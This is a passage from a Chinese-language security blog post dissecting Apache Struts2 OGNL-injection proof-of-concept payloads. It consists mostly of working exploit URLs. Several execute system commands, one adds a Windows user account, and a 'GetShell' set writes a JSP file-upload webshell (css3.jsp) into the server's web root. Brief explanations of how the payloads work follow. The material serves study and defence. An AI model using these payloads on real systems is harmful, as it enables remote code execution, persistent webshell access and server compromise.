class="string">'aa'</span>)]&amp;cmd=cmd%20/c%20netstat%20-an</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result),%23response.close()&#125;</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/struts2-blank/example/HelloWorld.action?redirect:<span class="variable">$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'netstat','-an'&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
<p>其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">"net user selina 123 /add"</span>);</div></pre></td></tr></table></figure></p>
<p>就可以执行任意命令了。Exec执行后返回的类型是java.lang.Process。Process是一个抽象类，final class ProcessImpl extends Process也是Process的具体实现。而命令执行后返回的Process可以通过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public OutputStream getOutputStream()</div><div class="line">public InputStream getInputStream()</div></pre></td></tr></table></figure></p>
<p>直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执行dir之类的命令可以加上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Process java.lang.Runtime.exec(String <span class="built_in">command</span>) throws IOException</div></pre></td></tr></table></figure></p>
<p>#####GetShell<br>poc1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\u0023_memberAccess[\'</span>allowStaticMethodAccess\<span class="string">']'</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003d\u0023foo'</span>)(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&amp;(i1)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(i12)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i13)((<span class="string">'\43xman.getWriter().println(\43req.getServletContext().getRealPath(%22\u005c%22))'</span>)(d))&amp;(i2)((<span class="string">'\43fos\75new\40java.io.FileOutputStream(new\40java.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@java.io.File@separator).append(%22css3.jsp%22).toString())'</span>)(d))&amp;(i3)((<span class="string">'\43fos.write(\43req.getParameter(%22p%22).getBytes())'</span>)(d))&amp;(i4)((<span class="string">'\43fos.close()'</span>)(d))&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())%2b'</span>%20&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc4:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc5:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()&#125;</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc6:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()&#125;</span>&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>比如POC4当中首先就是把allowStaticMethodAccess改为trute即允许静态方法访问。然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个css3.jsp，而css3.jsp的内容同样来自于客户端的请求。POC4中的p就是传入的参数，只要获取p就能获取到内容完成文件的写入了。之前已经说过Java不是动态的脚本语言，所以没有eval。不能像PHP那样直接用eval去动态执行，所以Java里面没有真正意义上的一句话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，因为这些代码在有eval的情况下是可以通过发送请求的形式去构造的，在这里就必须把代码给上传到服务器去编译成执行。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/07/18/解密Struts2-POC/" data-id="cjca1zrwx000y881bfa8ebhkp" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/">利用java反序列化漏洞植入门罗币挖矿程序事件分析</a>
          </li>
        
          <li>
            <a href="/2018/01/10/powershell植入mule挖矿程序事件分析/">powershell植入mule挖矿程序事件分析</a>
          </li>
        
          <li>
            <a href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/">利用s2-045植入门罗币挖矿程序事件分析</a>
          </li>
        
          <li>
            <a href="/2018/01/09/s2-045入侵事件分析/">s2-045入侵事件分析</a>
          </li>
        
          <li>
            <a href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <!--
<footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 SY0U<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
-->

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>